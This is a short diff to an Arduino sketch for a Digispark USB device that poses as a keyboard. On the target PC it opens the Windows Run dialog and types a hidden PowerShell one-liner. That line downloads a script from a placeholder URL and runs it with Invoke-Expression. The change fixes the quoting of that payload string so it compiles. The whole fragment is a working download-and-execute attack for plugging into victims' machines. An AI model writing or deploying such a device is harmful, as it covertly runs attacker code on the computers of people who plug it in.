@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(powershell -w hidden "$v = (New-Object Net.WebClient).DownloadString('OCT_URL');Invoke-Expression $v;");
+  DigiKeyboard.print("powershell -w hidden \"$v = (New-Object Net.WebClient).DownloadString('OCT_URL');Invoke-Expression $v;\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
